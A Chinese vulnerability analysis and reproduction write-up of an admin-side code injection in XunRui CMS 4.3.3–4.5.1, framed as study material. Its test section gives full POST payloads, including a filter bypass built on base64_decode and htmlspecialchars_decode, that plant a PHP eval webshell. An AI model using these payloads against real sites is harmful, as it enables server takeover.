# 迅睿CMS V4.3.3-V4.5.1 后台任意注入漏洞

- [迅睿CMS V4.3.3-V4.5.1 后台任意注入漏洞](#迅睿cms-v433-v451-后台任意注入漏洞)
  - [漏洞要求](#漏洞要求)
  - [漏洞分析](#漏洞分析)
  - [漏洞测试](#漏洞测试)
  - [小结](#小结)
  - [相关链接](#相关链接)

为了避免后续复现漏洞时没有源代码，故将20220707当天的master 代码克隆到当前目录下
本文章使用的是 `version 4.3.10 栏目数量最多限制为100个` 即 commit 为 `89b9497bf7fd89e468f7858b457a3e6e499bc44a` 的代码进行的漏洞复现和分析。

## 漏洞要求

- 版本为v4.3.3-v4.5.1
- 可以登陆后台并具有"应用"->"任务队列"的管理权限，`/admin.php?c=Cron&m=add`

## 漏洞分析

访问`admin.php?c=Cron&m=add`, 不用填写，点击保存，看网站目录下 `cache/config/cron.php` 内容如下：

```php
<?php defined('FCPATH') OR exit('No direct script access allowed');
 $json='{"1":{"name":"","code":""},"2":{"name":"","code":""},"3":{"name":"","code":""},"4":{"name":"","code":""},"5":{"name":"","code":""},"6":{"name":"","code":""},"7":{"name":"","code":""},"8":{"name":"","code":""},"9":{"name":"","code":""},"10":{"name":"","code":""},"11":{"name":"","code":""},"12":{"name":"","code":""},"13":{"name":"","code":""},"14":{"name":"","code":""},"15":{"name":"","code":""},"16":{"name":"","code":""},"17":{"name":"","code":""},"18":{"name":"","code":""},"19":{"name":"","code":""},"20":{"name":"","code":""}}';
```

从这里可以分析出，如果这个地方对于用户输入的内容过滤不严格，就非常容易存在漏洞

我们来分析一下 `cron.php` 中的`add` 方法：

```php
    // 任务类型
    public function add() {

        $json = '';
        if (is_file(WRITEPATH.'config/cron.php')) {
            require WRITEPATH.'config/cron.php';
        }

        $data = json_decode($json, true);

        if (IS_AJAX_POST) {

            $post = \Phpcmf\Service::L('input')->post('data', true);

            file_put_contents(WRITEPATH.'config/cron.php',
                '<?php defined(\'FCPATH\') OR exit(\'No direct script access allowed\');'.PHP_EOL.' $json=\''.json_encode($post).'\';');

            \Phpcmf\Service::L('input')->system_log('设置自定义任务类型');

            $this->_json(1, dr_lang('操作成功'));
        }

        \Phpcmf\Service::V()->assign([
            'data' => $data,
        ]);
        \Phpcmf\Service::V()->display('cron_add.html');
    }
```

从源码中可以看到有一个非常容易存在问题的地方

```php
if (is_file(WRITEPATH.'config/cron.php')) {
    require WRITEPATH.'config/cron.php';
}
```

如上面最开始所说的，如果对于用户输入的内容过滤不严格，导致可以写入任意内容，这段代码又通过 `require WRITEPATH.'config/cron.php';` 加载执行，那么就可以造成非常严重的漏洞

继续分析代码

```php
if (IS_AJAX_POST) {

    $post = \Phpcmf\Service::L('input')->post('data', true);

    file_put_contents(WRITEPATH.'config/cron.php',
        '<?php defined(\'FCPATH\') OR exit(\'No direct script access allowed\');'.PHP_EOL.' $json=\''.json_encode($post).'\';');

    \Phpcmf\Service::L('input')->system_log('设置自定义任务类型');

    $this->_json(1, dr_lang('操作成功'));
}
```

在上面这段代码中`file_put_contents` 函数会进行文件写入，不过问题也出在了这个地方，代码中的`$json=\''.json_encode($post).'\';');` `$json` 的值 是字符串的拼接，在内容的前后拼接了一个`'`，如果我们控制了这个值并且闭合前后的`'`,加入我们想要执行的代码，那么就造成了非常严重的漏洞。所以接下来我们需要顺着这个`json_encode($post)`往上找，看看看对于这个值是否可以进行控制。

分析`cron.php` 中的`add` 中 `post` 请求时数据的处理流程：

- `dayrui/Core/Controllers/Admin/Cron.php` 文件中 add 方法中调用 `$post = \Phpcmf\Service::L('input')->post('data', true);`
- 经过 `dayrui/Fcms/Library/Input.php` 文件中 `post` 方法又调用 `xss_clean`方法，并最终调用 `dayrui/Fcms/Library/Security.php` 中的 `xss_clean` 方法对`post`请求中的数据进行`xss`清理
- `dayrui/Core/Controllers/Admin/Cron.php` 文件中 add 方法中执行 `file_put_contents(WRITEPATH.'config/cron.php','<?php defined(\'FCPATH\') OR exit(\'No direct script access allowed\');'.PHP_EOL.' $json=\''.json_encode($post).'\';');` 将 post 数据 `json_encode` 并写入 `config/cron.php` 文件

## 漏洞测试

我们尝试直接在`admin.php?c=Cron&m=add` 的post请求中直接加入如下数据

```url
data[1][name]=&data[1][code]=[';file_put_contents('webshell.php','<?php eval(@$_POST["password"]);?>);return;']
// 完整的post 数据
is_form=1&is_admin=1&is_tips=&csrf_test_name=06b5fd7088e5c1036c2f522d34b19c47&data%5B1%5D%5Bname%5D=&data%5B1%5D%5Bcode%5D=%5B'%3bfile_put_contents('webshell.php','<%3fphp+eval(%40$_POST["password"])%3b%3f>)%3breturn%3b'%5D
```

这个是构造的data 数据，可以通过如下方式调试一下代码，方便看我们的调试结果：

```php
if (IS_AJAX_POST) {

    $post = \Phpcmf\Service::L('input')->post('data', true);
    // -----添加的调试代码-----
    var_dump(json_encode($post));
    exit();
    // -----添加的调试代码-----
    file_put_contents(WRITEPATH.'config/cron.php',
        '<?php defined(\'FCPATH\') OR exit(\'No direct script access allowed\');'.PHP_EOL.' $json=\''.json_encode($post).'\';');

    \Phpcmf\Service::L('input')->system_log('设置自定义任务类型');

    $this->_json(1, dr_lang('操作成功'));
}
```

测试我们上面的请求，可以看到如下结果：

```php
string(125) "{"1":{"name":"","code":"[';file_put_contents('webshell.php','&lt;?php eval&#40;@$_POST[\"password\"]&#41;;?&gt;);return;']"}}"
```

可以看到输入的内容被进行了编码:

- `<`被编码为 `&lt;`
- `>`被编码为 `&gt;`
- eval的`(`被编码为 `&#40;`
- eval的`)`被编码为 `&#41;`
- `"` 被进行了转义`\"`

接下来我们需要想办法绕过上面的转换

- 关于`>`和 `<` 的编码可以看出来是被进行的html编码，这个可以通过使用`htmlspecialchars_decode`来解决
- 关于`(`,`)`被编码以及`"`被转义可以通过 `base64_decode` 编码的方式进行绕过

这样将我们构造的post 的数据进行调整为：

```url
data[1][name]=&data[1][code]=[';file_put_contents('webshell.php',htmlspecialchars_decode('<').'?php%20eval'.base64_decode('KA==').'@$_POST%5B'.base64_decode('Ig==').'password'.base64_decode('Ig==').'%5D'.base64_decode('KQ==').';?'.htmlspecialchars_decode('>'));return;']
// 完整请求参数
is_form=1&is_admin=1&is_tips=&csrf_test_name=398242eb0f467c80b539d08baf47eb29&data%5B1%5D%5Bname%5D=&data%5B1%5D%5Bcode%5D=%5B'%3bfile_put_contents('webshell.php',htmlspecialchars_decode('<').'%3fphp%2520eval'.base64_decode('KA%3d%3d').'%40$_POST%255B'.base64_decode('Ig%3d%3d').'password'.base64_decode('Ig%3d%3d').'%255D'.base64_decode('KQ%3d%3d').'%3b%3f'.htmlspecialchars_decode('>'))%3breturn%3b'%5D
```

调试的结果为：

```php
string(265) "{"1":{"name":"","code":"[';file_put_contents('webshell.php',htmlspecialchars_decode('&lt;').'?php eval'.base64_decode('KA==').'@$_POST['.base64_decode('Ig==').'password'.base64_decode('Ig==').']'.base64_decode('KQ==').';?'.htmlspecialchars_decode('>'));return;']"}}"
```

我们上面添加的调试代码去掉，然后看看最终写入到`cache/config/cron.php` 内容如下：

```php
<?php defined('FCPATH') OR exit('No direct script access allowed');
 $json='{"1":{"name":"","code":"[';file_put_contents('webshell.php',htmlspecialchars_decode('&lt;').'?php eval'.base64_decode('KA==').'@$_POST['.base64_decode('Ig==').'password'.base64_decode('Ig==').']'.base64_decode('KQ==').';?'.htmlspecialchars_decode('>'));return;']"}}';
```

然后访问 `/admin.php?c=Cron&m=add` 这个时候就会在网站根目录下看到写入了一个webshell.php 文件，内容为：`<?php eval(@$_POST["password"]);?>`

需要注意的是我们构造的数据前后都有 `';` 这个就是为了闭合下面代码中的 `json_encode($post)` 前后的拼接的`'`

```php
 file_put_contents(WRITEPATH.'config/cron.php',
        '<?php defined(\'FCPATH\') OR exit(\'No direct script access allowed\');'.PHP_EOL.' $json=\''.json_encode($post).'\';');
```

## 小结

作为一个在学习完漏洞原理之后，把这个作为入门分析代码的例子还是非常不错的，过程也还比较有意思

## 相关链接

- <https://xz.aliyun.com/t/11457>
- <https://gitee.com/dayrui/xunruicms>
